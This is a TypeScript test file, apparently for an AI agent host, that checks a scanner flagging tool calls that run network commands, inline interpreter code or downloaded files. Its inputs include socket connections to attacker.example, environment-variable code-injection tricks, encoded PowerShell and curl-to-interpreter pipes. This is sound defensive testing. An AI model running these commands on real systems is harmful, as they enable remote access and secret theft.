// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// NOLIMITS v1 1.0.19 S1 + S2 (designs/NOLIMITS-V1-1019-REDESIGN.md r3, section 6): tests written first, red on 5ec36bd35.
// Owner No limits, clean turn, unless a case says otherwise.
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { beginOutsideTurn, downloadRegistry, forgetOutsideState, markTurnOutside, recallRowsOutside, turnOutsideRead, wireOutsideStore } from "./email/external-marks.ts";
import { ownToolGate } from "./outside-own.ts";
import { fileOutsideStore } from "./outside-store.ts";
import { engineEnvDenied, engineEnvLoadsCode, forgetEngineEnv, nodeOptionWords, noteEngineEnv, outsideScanMarks, type DiskProbe, type OutsideScanHooks } from "./outside-scan.ts";
import { execCli, execCliSync, spawnCli } from "./procs.ts";
import { delimiter } from "node:path";
import { installPathUnknown, noteEnginePath } from "./outside-wire.ts";
import { symlinkSync } from "node:fs";
import { cloudTurnEnvironment } from "./cloud-home/turn-process.ts";
import { acpJudgedAtSource, noteAcpCallOutside, noteToolStartOutside, outsideContextFields, toolStartOutside, type DlScan, type ToolStart } from "./outside-wire.ts";
import { ACP_LOCATIONS_MAX, acpOutsideCall } from "./drivers/acp/core.ts";
import { claudeToolKey } from "./drivers/claude.ts";
import { loggedRuntimeEvent, windowRuntimeEvent } from "./runtime-event-out.ts";
import type { RuntimeEvent } from "./contracts.ts";
import { DownloadRegistry, TEXT_SYSCALLS, TextBudget, registryKey } from "./download-registry.ts";
import { nodeFsHooks } from "./outside-dl.ts";

afterEach(() => forgetOutsideState());
const wire = () => { wireOutsideStore(fileOutsideStore(join(mkdtempSync(join(tmpdir(), "nlmi-s1s2-")), "s.jsonl"))); beginOutsideTurn("t1", "i1", "turn-1", false); };
const stamped = (name: string, extra: Partial<ToolStart> & { stampKind?: string } = {}): ToolStart => {
  const { stampKind, ...rest } = extra;
  return { origin: "engine", title: name, toolIdentity: { namespace: "fuigo_build", name, ...(stampKind ? { kind: stampKind } : {}) }, ...rest };
};
const acp = { acpRaw: true } as const;

describe("S1 O1: engine-own stamp namespaces are not an outside server", () => {
  it("U1: stamped run_terminal_command `ls` and stamped write_file do not mark", () => {
    expect(toolStartOutside(stamped("run_terminal_command", { toolKind: "execute", stampKind: "execute", input: { command: "ls" } }), undefined, acp)).toBeNull();
    expect(toolStartOutside(stamped("write_file", { toolKind: "edit", stampKind: "write", input: { path: "/w/a.txt", content: "x" } }), undefined, acp)).toBeNull();
    for (const ns of ["fuigo_build_concise", "fuigo_build_hashline"]) {
      expect(toolStartOutside({ origin: "engine", title: "read_file", toolKind: "read", toolIdentity: { namespace: ns, name: "read_file", kind: "read" }, input: { path: "/w/a" } }, undefined, acp)).toBeNull();
    }
  });
  it("U1: a stamped shell still runs the scan", () => {
    expect(toolStartOutside(stamped("run_terminal_command", { toolKind: "execute", input: { command: "curl https://x -o p.html" } }), undefined, acp)).toBe("network command");
  });
  it("U2: stamped web_search marks `web search`; a stamped fetch kind marks `web page`", () => {
    expect(toolStartOutside(stamped("web_search", { stampKind: "web_search", input: { query: "q" } }), undefined, acp)).toBe("web search");
    expect(toolStartOutside(stamped("web_fetch", { toolKind: "fetch", stampKind: "web_fetch", input: { url: "https://x" } }), undefined, acp)).toBe("web page");
  });
  it("U3: stamped use_tool is judged on the wrapped tool: own server none, another server `outside tool`", () => {
    const wrap = (tool: string): ToolStart => ({ ...stamped("use_tool", { stampKind: "use_tool", input: { tool_name: tool } }), title: tool, wrapped: true });
    expect(toolStartOutside(wrap("murage-memory__list_bots"), undefined, acp)).toBeNull();
    // (`browser` is one of Murage's own builtins, shared/own-servers.ts: a foreign server is the one that marks)
    expect(toolStartOutside(wrap("browser__open"), undefined, acp)).toBeNull();
    expect(toolStartOutside(wrap("github__get_issue"), undefined, acp)).toBe("outside tool");
  });
  it("U4: a stamped name off the table with no kind still marks", () => {
    expect(toolStartOutside(stamped("mystery_tool"), undefined, acp)).toBe("outside tool");
  });
});

describe("S1 A5: one judge per ACP call", () => {
  it("U5 / U16: every ACP driver is judged at its source; Claude and Codex are not", () => {
    for (const kind of ["fuigoAgent", "grokAgent", "geminiAgent", "cursorAgent", "kimiAgent", "droidAgent", "customAcp", "clineAgent", "opencodeGo"]) expect(acpJudgedAtSource(kind)).toBe(true);
    for (const kind of ["claudeAgent", "codex", undefined]) expect(acpJudgedAtSource(kind)).toBe(false);
  });
  it("U5: an unstamped Gemini execute `touch result.txt` does not mark on its protocol fields", () => {
    expect(toolStartOutside(acpOutsideCall({ kind: "execute", title: "touch result.txt", rawInput: { command: "touch result.txt" } }), undefined, acp)).toBeNull();
  });
});

describe("S1 4.4 / 4.5: unstamped search and locations", () => {
  it("U6: a Gemini read with only locations does not mark", () => {
    expect(toolStartOutside(acpOutsideCall({ kind: "read", title: "a.txt", locations: [{ path: "/w/a.txt" }] } as never), undefined, acp)).toBeNull();
  });
  it("U6b: search with a pattern and path is local; search with a query is a web search", () => {
    expect(toolStartOutside(acpOutsideCall({ kind: "search", title: "grep", rawInput: { pattern: "TODO", path: "/w" } }), undefined, acp)).toBeNull();
    expect(toolStartOutside(acpOutsideCall({ kind: "search", title: "search", rawInput: { query: "weather" } }), undefined, acp)).toBe("web search");
  });
});

describe("S1 A6 / 4.2 / 4.3 / 4.6: Codex shell, own servers, Claude names", () => {
  it("U7: Codex `shell` runs the scan", () => {
    expect(toolStartOutside({ origin: "engine", title: "ls -la", toolIdentity: { name: "shell" }, input: { command: "ls -la" } })).toBeNull();
    expect(toolStartOutside({ origin: "engine", title: "curl", toolIdentity: { name: "shell" }, input: { command: "curl https://x -o p.html" } })).toBe("network command");
  });
  it("U7b / U3b: an own server's tool never marks at the item, whatever its name", () => {
    expect(toolStartOutside({ origin: "engine", title: "memory_search", toolIdentity: { namespace: "murage-memory", name: "memory_search" } })).toBeNull();
    expect(toolStartOutside({ origin: "engine", title: "mcp__murage-memory__memory_search", input: { query: "x" } })).toBeNull();
    expect(toolStartOutside({ origin: "engine", title: "mcp__stranger__fetch" })).toBe("outside tool");
  });
  it("4.6: Claude AskUserQuestion, Skill, SlashCommand, EnterPlanMode are local", () => {
    for (const name of ["AskUserQuestion", "Skill", "SlashCommand", "EnterPlanMode"]) expect(toolStartOutside({ origin: "engine", title: name, input: {} })).toBeNull();
  });
});

describe("S1 4.2 r3: own recall marks only on evidence, at the release (U3b, U3c)", () => {
  it("U3b / U3c at the gate: no recall tool and no saved-result read marks at the middleware", () => {
    for (const tool of ["memory_search", "memory_get", "thread_search", "thread_list", "thread_read", "tool_result_read"]) {
      wire();
      expect(ownToolGate({ threadId: "t1", botId: "b1", tool, lane: true }), tool).toBeNull();
      expect(turnOutsideRead("t1"), tool).toBeNull();
      forgetOutsideState();
    }
  });
  it("U3c: released rows of clean turns do not mark; one row of a marked turn marks the reading turn `memory`", () => {
    let now = 10_000;
    expect(wireOutsideStore(fileOutsideStore(join(mkdtempSync(join(tmpdir(), "nlmi-s1s2-")), "s.jsonl")), () => now)).toBe(true);
    beginOutsideTurn("t0", "i0", "turn-0", false);
    markTurnOutside("t0", "web page");
    now = 200_000;
    beginOutsideTurn("t1", "i1", "turn-1", false);
    expect(recallRowsOutside("t1", [])).toBeNull();
    expect(recallRowsOutside("t1", [{ threadId: "t9", at: 150_000 }, { threadId: "t1", at: 190_000 }])).toBeNull();
    expect(turnOutsideRead("t1")).toBeNull();
    expect(recallRowsOutside("t1", [{ threadId: "t9", at: 150_000 }, { threadId: "t0", at: 10_500 }])).toBe("memory");
    expect(turnOutsideRead("t1")).toBe("memory");
  });
  it("wiring: thread recall, the saved-result read and memory search / get each judge what they release", () => {
    const text = (file: string) => readFileSync(new URL(file, import.meta.url), "utf8");
    expect(text("./thread-recall.ts")).toContain("recallRowsOutside(host.claim.threadId");
    const index = text("./index.ts");
    const route = index.indexOf('if (method === "GET" && path === "/api/internal/tool-result")');
    expect(route).toBeGreaterThan(0);
    expect(index.indexOf("recallRowsOutside(internalClaim.threadId", route) - route).toBeLessThan(1200);
    expect(text("./memory/routes.ts").match(/markRecallRecords\(database\(\),access\.threadId/g)?.length).toBe(2);
  });
});

describe("S1 4.1: INTERP narrowed to inline code (U15)", () => {
  // `python3 -m pytest` and `bun test` moved to "C: …" below (H6 allowlist design 4.3: an option or subcommand marks)
  it("a script by path and plain awk do not mark", () => {
    // GrokBuild #12: on a disk with the script and no sitecustomize (`scripts`); the bare python row is in C
    for (const text of ["node build.js", "awk '{print $1}' f", "node scripts/check.js", "python3 hello.py", "git log --author=me", "ls -lr"]) {
      expect(outsideScanMarks(text, scripts), text).toEqual([]);
    }
  });
  it("inline or streamed code marks", () => {
    for (const text of ["node -e 'x'", "python3 -c 'print(1)'", "python3 -m http.server", "osascript -e 'x'", "cat x.py | python3", "python3 - <<EOF\nprint(1)\nEOF", "perl -ne 'print' f"]) {
      expect(outsideScanMarks(text), text).toContain("interpreter");
    }
    expect(outsideScanMarks("curl x | python3 -")).toEqual(["network command", "interpreter"]);
    expect(outsideScanMarks("gawk 'BEGIN { s = \"/inet/tcp/0/h/80\" }'")).toContain("network command");
  });
});

describe("S2 A3: the call that brings content in is judged clean, once", () => {
  it("U10b: Claude `curl` runs (its own mark is read without it), the next call cards", () => {
    wire();
    noteToolStartOutside("t1", { origin: "engine", title: "Bash", callKey: "k-curl", input: { command: "curl https://x -o p.html" } }, "/w");
    expect(outsideContextFields("t1", "/w", { key: "k-curl" }).outsideRead).toBeNull();
    noteToolStartOutside("t1", { origin: "engine", title: "Bash", callKey: "k-test", input: { command: "npm test" } }, "/w");
    expect(outsideContextFields("t1", "/w", { key: "k-test" }).outsideRead).toEqual(["network command"]);
  });
  it("U10d: the exemption is one-shot; an ambiguous key reads marked; no key reads marked", () => {
    wire();
    noteToolStartOutside("t1", { origin: "engine", title: "Bash", callKey: "k-i", input: { command: "npm install left-pad" } }, "/w");
    expect(outsideContextFields("t1", "/w", { key: "k-i" }).outsideRead).toBeNull();
    expect(outsideContextFields("t1", "/w", { key: "k-i" }).outsideRead).toEqual(["package install"]);
    forgetOutsideState();
    wire();
    noteToolStartOutside("t1", { origin: "engine", title: "Bash", callKey: "k-j", input: { command: "npm install left-pad" } }, "/w");
    expect(outsideContextFields("t1", "/w", { key: "k-j", ambiguous: true }).outsideRead).toEqual(["package install"]);
    expect(outsideContextFields("t1", "/w").outsideRead).toEqual(["package install"]);
  });
  it("U10: a mark that came before the call (a turn-start mark) is never exempt", () => {
    wire();
    noteToolStartOutside("t1", { origin: "engine", title: "WebFetch", callKey: "k-web", input: { url: "https://x" } }, "/w");
    noteToolStartOutside("t1", { origin: "engine", title: "Bash", callKey: "k-curl", input: { command: "curl https://x" } }, "/w");
    expect(outsideContextFields("t1", "/w", { key: "k-curl" }).outsideRead).toEqual(["web page"]);
  });
});

// Astra r1 on 4774e38b1 (H1, H3-H6): tests first, red on 4774e38b1. H2 is driver-level (drivers/acp/acp-outside-judge.test.ts).
describe("Astra r1 H1: a call key is opaque and never leaves the server", () => {
  const SECRET = "SECRET-TOKEN-h1-0042";
  it("H1: a Claude call key is a digest: no tool name, no input; equal for the same call (keys sorted), different otherwise", () => {
    const key = claudeToolKey("Bash", { command: `cat ~/.env ${SECRET}`, description: "show" });
    for (const leaked of [SECRET, "Bash", "command", "cat ~/.env"]) expect(key).not.toContain(leaked);
    expect(key).toBe(claudeToolKey("Bash", { description: "show", command: `cat ~/.env ${SECRET}` }));
    expect(key).not.toBe(claudeToolKey("Bash", { command: "cat ~/.env", description: "show" }));
    expect(key).not.toBe(claudeToolKey("Read", { command: `cat ~/.env ${SECRET}`, description: "show" }));
    expect(key.length).toBeLessThanOrEqual(64);
  });
  it("H1: no call key goes out on the stream or into the event log, for any event that carries one", () => {
    const base = { eventId: "e1", provider: "claudeAgent", providerInstanceId: "i1", threadId: "t1", createdAt: "2026-11-06T00:00:00Z", turnId: "u1" };
    const events = [
      { ...base, type: "item.started", itemType: "tool", origin: "engine", itemId: "x1", title: "Bash", input: { command: "ls" }, callKey: `Bash\u0000{"command":"${SECRET}"}` },
      { ...base, type: "item.started", itemType: "tool", origin: "engine", itemId: "x2", title: "Read", callKey: "codex-item-7" },
      { ...base, type: "request.opened", requestId: "r1", requestType: "permission", tool: "Bash", summary: "s", choices: [], callKey: `Bash\u0000${SECRET}`, callKeyAmbiguous: true },
    ] as unknown as RuntimeEvent[];
    for (const event of events) {
      for (const out of [windowRuntimeEvent(event), loggedRuntimeEvent(event)]) {
        const text = JSON.stringify(out);
        expect(text, event.type).not.toContain("callKey");
        expect(text, event.type).not.toContain(SECRET);
      }
    }
  });
});

describe("Astra r1 H3-H5: every path a call names goes to the DL check", () => {
  const dir = (name: string) => { const d = mkdtempSync(join(tmpdir(), `nlmi-h-${name}-`)); return d; };
  const scan = (registry: DownloadRegistry, cwd: string): DlScan => ({ registry, cwd, home: homedir(), budget: new TextBudget(nodeFsHooks()), pathFolders: [] });
  const holding = (file: string) => { const r = new DownloadRegistry(); r.add([{ kind: "file", path: registryKey(file), since: 1 }]); return r; };
  const locations = (folder: string, n: number) => Array.from({ length: n }, (_, i) => ({ path: join(folder, `f${i + 1}.txt`) }));

  it("H3: a read whose only downloaded target is past the location cap marks (fail closed on overflow)", () => {
    const folder = dir("h3r");
    const cwd = dir("h3cwd");
    const registry = holding(join(folder, "f70.txt"));
    expect(toolStartOutside(acpOutsideCall({ kind: "read", title: "Read", locations: locations(folder, 70) } as never), scan(registry, cwd), acp)).toBe("downloaded file");
    expect(toolStartOutside(acpOutsideCall({ kind: "read", title: "Read", locations: locations(folder, ACP_LOCATIONS_MAX + 1) } as never), scan(registry, cwd), acp)).toBe("downloaded file");
    // the cap itself is not a mark: a call at the cap is judged path by path within one call's syscall budget (a fresh
    // budget per call, as dlFor gives), so cap clean locations stay clean, existing or not
    expect(toolStartOutside(acpOutsideCall({ kind: "read", title: "Read", locations: locations(folder, ACP_LOCATIONS_MAX) } as never), scan(registry, cwd), acp)).toBeNull();
    for (const loc of locations(folder, ACP_LOCATIONS_MAX)) writeFileSync(loc.path, "x");
    expect(toolStartOutside(acpOutsideCall({ kind: "read", title: "Read", locations: locations(folder, ACP_LOCATIONS_MAX) } as never), scan(registry, cwd), acp)).toBeNull();
  });
  it("H3 (relay 6): the location cap fits one call's syscall budget (a realpath and an lstat per location)", () => {
    expect(ACP_LOCATIONS_MAX * 2).toBeLessThanOrEqual(TEXT_SYSCALLS);
  });
  it("H3: a marked edit with more locations than the cap spans the turn", () => {
    expect(wireOutsideStore(fileOutsideStore(join(dir("h3s"), "s.jsonl")))).toBe(true);
    beginOutsideTurn("t-h3", "i-h3", `turn-h3-${Date.now()}`, false);
    markTurnOutside("t-h3", "web page");
    expect(downloadRegistry().spanCount()).toBe(0);
    const folder = dir("h3w");
    noteAcpCallOutside("t-h3", acpOutsideCall({ kind: "edit", title: "Edit", rawInput: {}, locations: locations(folder, 70) } as never), folder, true);
    expect(downloadRegistry().spanCount()).toBeGreaterThan(0);
  });
  it("H4: a search's dir, directory, glob, include and file_pattern are Matched as searched folders", () => {
    const outside = dir("h4out");
    const clean = dir("h4clean");
    const dl = scan(holding(join(outside, "notes", "a.md")), clean);
    for (const input of [
      { pattern: "x", directory: outside }, { pattern: "x", dir: outside }, { pattern: "x", glob: `${outside}/**/*.md` },
      { pattern: "x", include: `${outside}/notes/*.md` }, { pattern: "x", file_pattern: `${outside}/**` }, { pattern: "x", path: clean, glob: "../" + outside.split(/[\\/]/).pop() + "/**" },
    ]) {
      expect(toolStartOutside(acpOutsideCall({ kind: "search", title: "grep", rawInput: input }), dl, acp), JSON.stringify(input)).toBe("downloaded file");
    }
    // Claude Glob: the pattern is the folder it searches
    expect(toolStartOutside({ origin: "engine", title: "Glob", input: { pattern: `${outside}/**/*.md` } }, dl)).toBe("downloaded file");
    expect(toolStartOutside({ origin: "engine", title: "Grep", input: { pattern: "x", glob: `${outside}/**` } }, dl)).toBe("downloaded file");
    // clean folders stay clean
    for (const input of [{ pattern: "x", directory: clean }, { pattern: "x", path: clean, glob: "*.md" }, { pattern: "x", include: "src/**/*.ts" }]) {
      expect(toolStartOutside(acpOutsideCall({ kind: "search", title: "grep", rawInput: input }), dl, acp), JSON.stringify(input)).toBeNull();
    }
    expect(toolStartOutside({ origin: "engine", title: "Glob", input: { pattern: "**/*.ts" } }, dl)).toBeNull();
  });
  it("H5: a Claude Skill's folder (project, user, or a path it names) goes by DL", () => {
    const cwd = dir("h5cwd");
    mkdirSync(join(cwd, ".claude", "skills", "evil"), { recursive: true });
    const dl = scan(holding(join(cwd, ".claude", "skills", "evil", "SKILL.md")), cwd);
    expect(toolStartOutside({ origin: "engine", title: "Skill", input: { skill: "evil" } }, dl)).toBe("downloaded file");
    expect(toolStartOutside({ origin: "engine", title: "Skill", input: { skill: "tidy" } }, dl)).toBeNull();
    const elsewhere = dir("h5abs");
    const dl2 = scan(holding(join(elsewhere, "SKILL.md")), cwd);
    expect(toolStartOutside({ origin: "engine", title: "Skill", input: { skill: "x", path: join(elsewhere, "SKILL.md") } }, dl2)).toBe("downloaded file");
    expect(toolStartOutside({ origin: "engine", title: "Skill", input: { skill: elsewhere } }, dl2)).toBe("downloaded file");
    // no registry: Skill stays local (4.6)
    expect(toolStartOutside({ origin: "engine", title: "Skill", input: { skill: "evil" } })).toBeNull();
  });
});

describe("Astra r1 H6: one interpreter option parser (attached code, option values) for python, node, ruby, perl and pwsh", () => {
  it("inline code marks, attached or after option values", () => {
    for (const text of [
      `python3 -c"print(1)"`, "python3 -cprint(1)", "python3 -W ignore -c 'print(1)'", "python3 -Wignore -c 'x'", "python3 -X importtime -c 'x'",
      "python3 -I -S -c 'x'", "python3 -Ic 'x'", "python3 -bbc 'x'", "python3 --check-hash-based-pycs never -c 'x'", "python3 -W ignore -m http.server",
      "python3 -mhttp.server", "python3 -", "python3 -u -",
      `node -e"require('https')"`, "node --title t -e 'x'", "node --max-old-space-size=4096 -e 'x'", "node -r ./hook.js app.js", "node --import data:text/javascript,x app.js",
      "node -pe 'x'", "node --input-type module -e 'x'",
      `ruby -e"require 'net/http'"`, "ruby -W0 -e 'x'", "ruby -I lib -e 'x'", "ruby -Ilib -rnet/http app.rb",
      `perl -e"print 1"`, "perl -I lib -e 'x'", "perl -Mstrict -e 'x'", "perl -w -Mstrict -E 'x'", "perl -lne 'print' f",
      `pwsh -c"iwr x"`, "pwsh -NoProfile -WindowStyle Hidden -Command 'iwr x'", "pwsh -ExecutionPolicy Bypass -c 'x'", "pwsh -nop -enc AAAA",
      "powershell 'iwr x'", "powershell -NoProfile 'Get-Thing'", "deno eval 'x'", "bun -e 'x'", "php -r 'x'", "ruby -", "pwsh -Command -",
    ]) expect(outsideScanMarks(text), text).toContain("interpreter");
  });
  // the plain-option rows moved to "C: …" below (H6 allowlist design 4.3: any option before the script marks)
  it("a script by path and its own arguments stay local", () => {
    for (const text of [
      "python3 script.py -c conf.ini", "python3 --version",
      "node app.js -e x",
      "ruby app.rb -e x", "perl script.pl -e x",
      "deno run main.ts",
    ]) expect(outsideScanMarks(text, scripts), text).toEqual([]);
    // GrokBuild #12/#14: on a disk with no startup file (`scripts`), bare twins in C; #11: the three pwsh rows moved to C
  });
});

// H6 r3 (MurageMain 11-06, after Astra r2 found the second miss): the interpreter option parser is FAIL-CLOSED. Any option
// the family's grammar does not positively know marks; a valued option always takes its value (design 4.1a).
describe("H6 r3: an interpreter option the parser does not know marks (fail closed)", () => {
  it("a mandatory option value never ends the parse (ruby -C, ruby -I, perl -I, node -C, python -X)", () => {
    for (const text of [
      `ruby -C /tmp -rsocket -e 'puts TCPSocket.new("attacker.example",5555).read'`, "ruby -C /tmp -e 'x'", "ruby -C ./lib -rsocket app.rb",
      "ruby -I /tmp/lib -e 'x'", "ruby -I ./lib -rnet/http app.rb", "perl -I /tmp/lib -e 'x'", "perl -I ./lib -MIO::Socket -e 'x'",
      "node -C dev -e 'x'", "node -C ./x.js -e 'x'", "python3 -X ./x.py -c 'x'", "python3 -W ./x.py -c 'x'", "php -d ./x.ini -r 'x'",
      "lua -l ./m.lua -e 'x'", "osascript -l JavaScript -e 'x'", "node --title ./x.js -e 'x'", "deno -c eval 'x'",
    ]) expect(outsideScanMarks(text), text).toContain("interpreter");
  });
  it("an unknown short or long option, a missing value or a module with arguments marks", () => {
    for (const text of [
      "ruby -Q app.rb", "ruby --frobnicate app.rb", "perl -d:Trace script.pl", "perl -MO=Deparse script.pl", "perl -MIO::Socket=inet x.pl",
      "python3 -Z app.py", "python3 --frobnicate app.py", "python3 -m", "node --frobnicate app.js", "node --run build", "node -C",
      "ruby -I", "ruby -I -w app.rb", "php -S localhost:8000", "php -q -k x.php", "lua -E x.lua", "osascript -k x.scpt",
      "julia --project=. x.jl", "swift -O x.swift", "Rscript --vanilla x.R", "deno run --frobnicate x.ts", "bun --frobnicate x.ts",
      "pwsh -Frobnicate ./x.ps1", "pwsh -ExecutionPolicy", "powershell -NoProfileLoadTime -File x.ps1",
    ]) expect(outsideScanMarks(text), text).toContain("interpreter");
  });
  // every other row of this `it` moved to "C: …" below (H6 allowlist design 4.3; these two stay by S2 b)
  it("--version stays local", () => {
    for (const text of ["ruby --version", "python3 --version"]) expect(outsideScanMarks(text), text).toEqual([]);
  });
});

// H6 allowlist (designs/NOLIMITS-S1S2-H6-ALLOWLIST.md section 4, NOLIMITS 1.0.18 lane), tests first on ba3d38869.
// Layer 1 (MurageMain order 11-06, master gate M1 / mechanism M2): a text naming an interpreter is unmarked only when the
// whole original text is plain words with single spaces (`[A-Za-z0-9_./:@+,=-]`) in the shape `<interp> <script> [operands]`;
// a command-prefix assignment or an env-setting word marks `interpreter` on ANY text. Layer 2: S1-S11 plus the env ruling
// (E1-E3, no SAFE_ENV) and Astra acct4's five folds.
// GrokBuild review (ba3d38869) cases 5, 6, 8, 10, 12-14, 17: the disk the scan reads through `hooks.probe`. `files` maps an
// absolute path to its kind; `real`, `fresh` and `zip` override a path's realpath, changed-this-turn and `PK` magic.
const CONFIG_NAMES = /^(?:sitecustomize|usercustomize)(?:\.pyc?)?$|^\.?bunfig\.toml$|^deno\.jsonc?$|^import_map\.json$/;
// Grok r1 G4 (MurageMain 11-06): a bare python whose engine PATH cannot be read marks (its own site dirs are unread), so
// both disks carry an engine PATH that finds no program (`null`); a row that needs another PATH overrides it.
const disk = (files: Record<string, DiskProbe["kind"]>, extra: { real?: Record<string, string>; fresh?: string[]; zip?: string[]; native?: string[] } = {}): OutsideScanHooks => ({
  cwd: "/w", home: "/h", lookupProgram: () => null,
  probe: (p) => (p in files ? { kind: files[p]!, real: extra.real?.[p] ?? p, fresh: extra.fresh?.includes(p) ?? false, zip: extra.zip?.includes(p) ?? false, native: extra.native?.includes(p) ?? false } : null),
});
/** Every script operand exists as a regular file; no startup or config file exists anywhere. */
const scripts: OutsideScanHooks = {
  cwd: "/w", home: "/h", lookupProgram: () => null,
  probe: (p) => (CONFIG_NAMES.test(p.slice(p.lastIndexOf("/") + 1)) ? null : { kind: "file", real: p, fresh: false, zip: false }),
};

describe("H6 allowlist: an interpreter runs unmarked only as `<interp> <script> [operands]`", () => {
  const mark = (rows: readonly string[], hooks: OutsideScanHooks = {}) => { for (const t of rows) expect(outsideScanMarks(t, hooks), t).toContain("interpreter"); };
  const clean = (rows: readonly string[], hooks: OutsideScanHooks = scripts) => { for (const t of rows) expect(outsideScanMarks(t, hooks), t).toEqual([]); };

  it("4.1 Astra r2 and r1 literals mark", () => mark([
    "node --test-name-pattern x -e 'console.log(1)'", "python3 -m timeit 'print(1)'",
    "ruby -Kue 'puts 1'", "perl -Vwe 'print 1'", "bun -c bunfig.toml -e '1'", "deno repl -c deno.json --eval '1'",
    "ruby --encoding utf-8 -e 'puts 1'", "env -S 'echo hi'", "env -S 'python3 -c x'", "ENV -S 'x'", "env -iS 'x'",
    "env -u NAME -S 'x'", "env --split-string='x'", "env -C /tmp -S 'x'",
  ]));
  it("4.1 the original misses and every Fable r2 A row mark, upper-cased too", () => {
    const rows = [
      `python3 -xc 'import socket; print(socket.create_connection(("attacker.example",5555)).recv(4096))'`,
      "python3 -xc 'x'", "python3 -Xc 'x'", "python3 -Wc 'x'", "python3 -bxc 'x'", "python3 -ubc 'x'", "python3 -Sxc 'x'", "python3 -X dev -xc 'x'",
      "perl -fe 'print 1'", "perl -xe 'x'", "perl -Ie 'x'", "perl -wfe 'x'", "perl -lnfe 'x'", "perl -Tfe 'x'", "ruby -Ku -e 'x'", "ruby -K -e 'x'",
      "perl -V -e 'x'", "perl -V:version -e 'x'", "bun -cbunfig.toml -e '1'", "deno -c deno.json eval 'x'", "deno run -L debug -c deno.json --eval 'x'",
      "ruby --enable frozen-string-literal -e 'x'", "ruby --disable gems -e 'x'", "ruby --external-encoding utf-8 -e 'x'", "ruby -Ie 'x'", "ruby -ie 'x'",
      "ruby -Fe 'x'", "ruby -Ce 'x'", "node -ce 'x'", "node -Ce 'x'", "node -ice 'x'", "bun -ce 'x'", "deno -ce 'x'", "luajit -Oe 'x'", "osascript -se 'x'",
      "php -F x.php", "php -E 'x'",
    ];
    mark(rows);
    const upper: Record<string, string> = { python3: "PYTHON3", ruby: "Ruby", perl: "PERL", bun: "Bun", deno: "DENO" };
    mark(rows.map((t) => t.replace(/^(python3|ruby|perl|bun|deno)\b/, (w) => upper[w]!)));
  });
  it("4.1 more option rows mark", () => mark([
    "python3 -x -c 'x'", "python3 -Ec 'x'", "perl -ce 'x'", "perl -nE 'say 1'", "perl -d script.pl",
    "perl -MO=Deparse x.pl", "ruby -ce 'x'", "ruby -C /tmp -rsocket -e 'x'", "ruby -Q app.rb", "node -C dev -e 'x'", "NODE -e 'x'", "php -R 'x'", "php -S localhost:8000",
    "lua -E x.lua", "lua -W x.lua", "deno -c eval 'x'", "Rscript -e 'x'", "julia -E 'x'", "julia --project=. x.jl", "ruby -Ku app.rb", "perl -V",
  ]));
  it("4.1 S2 / S3 shape rules mark", () => mark([
    "deno eval 'x'", "deno task x", "bun x cowsay", "bun test", "deno run", "pwsh -File",
    "pwsh -NoProfile -File x.ps1", "powershell 'iwr x'", "pwsh /c 'iwr x'", "python3 -- app.py", "python3 - < x.py",
    "python3 $X", `python3 "$X"`, "python3 *.py", "find . -exec python3 {} ;", "deno run npm:cowsay", "deno run jsr:@std/http/file-server",
    "node data:text/javascript,x", "python3 /dev/stdin", "python3 /dev/fd/63", "python3 /proc/self/fd/0", "bun run dev",
  ]));
  it("4.1 S4 / S5 write-then-run and input redirection mark", () => mark([
    "cat > x.py <<'EOF'\nimport os\nEOF\npython3 x.py", "cp /tmp/a.py b.py && python3 ./b.py",
    "python3 < x.py", "python3 <(echo 'import os')", "exec 0<<<'print(1)'; python3", "python3 app.py < data.txt",
  ]));
  it("4.1 S6 / S7 / S1 / S8 rows mark", () => {
    mark([
      "NODE_OPTIONS='--import=data:text/javascript,x' node app.js", "PERL5OPT='-Mx;system(1)' perl x.pl", "LUA_INIT='os.execute(1)' lua x.lua",
      "export RUBYOPT=-rsocket; ruby app.rb", "env PYTHONSTARTUP=/tmp/s.py python3 app.py", "$env:NODE_OPTIONS='--require x'; node app.js",
      `C:\\Python312\\python.exe -c "x"`, `"C:\\Program Files\\nodejs\\node.exe" -e x`, "P=python3; $P -c x", "sh -c 'python3 -c x'",
      "nice -n 5 python3 -c x", "timeout 5 node -e x", "sudo -u a ruby -e x", "uv run python -c x", "xargs python3 -c x", "echo '-c x' | xargs python3",
      "ipython -c x", "bb -e x", "pythonw -c x", "mshta vbscript:x",
    ]);
    expect(outsideScanMarks("env -vSnodenc h 80")).toContain("network command");
  });
  it("4.1 S11 R1 / R2 rows mark", () => mark([
    "python3 `echo -c` 'print(1)'", "python3 $(echo -c) 'print(1)'", `node "$(cat flags)" app.js`, "sh -c 'python3 `echo -c` x'", `node app.js "$(date)"`,
    `sh -c 'LUA_INIT="print(1)" lua app.lua'`, `bash -c "NODE_OPTIONS='--require x' node app.js"`, "env -i LUA_INIT=x lua app.lua", "X=1 echo hi; python3 app.py",
    `python3 app.py --sql "a=1"`, "printf -v NODE_OPTIONS -- '--require x'; node app.js", "Set-Item env:NODE_OPTIONS '--require x'; node app.js",
    "[Environment]::SetEnvironmentVariable('NODE_OPTIONS','--require x'); node app.js", "${NODE_OPTIONS:=--require x} node app.js", "NODE_OPTIONS+=' -r x' node app.js",
  ]));
  it("MurageMain env ruling (E1-E3, no SAFE_ENV) MUST-MARK rows", () => mark([
    "env LUA_INI\\T='print(1)' lua app.lua", "LUA_INI\\T='print(1)' lua app.lua", "export LUA_INIT; lua app.lua", "X=1 python3 app.py",
    "env -i python3 app.py", "declare -x NODE_OPTIONS='-r x'; node app.js", "py\\thon3 -c x", `LUA_INI""T=x lua app.lua`,
    "C:\\Python312\\python.exe app.py",
  ]));
  it("Astra acct4 confirm of the env rule: the five literals mark", () => mark([
    `set -a; printf -v LUA_INI""T %s 'print(1)'; lua app.lua`, "declare -x 'LUA_INI''T'='print(1)'; lua app.lua",
    "[Environment]::SetEnvironmentVariable('NODE_'+'OPTIONS','--require ./hook.cjs'); node app.js",
    "set NODE_OPTIO^NS=--require ./hook.cjs&node app.js", "BASH_ENV=./hook.sh bash app.sh",
  ]));
  it("M1 master gate: one character outside the plain set marks", () => mark([
    "python3 app.py a'b'", `python3 app.py a"b"`, "python3 app.py a\\b", "python3 app.py a^b", "python3 app.py a$b", "python3 app.py a`b`",
    "python3 app.py a;b", "python3 app.py a&b", "python3 app.py a|b", "python3 app.py a<b", "python3 app.py a>b", "python3 app.py a(b",
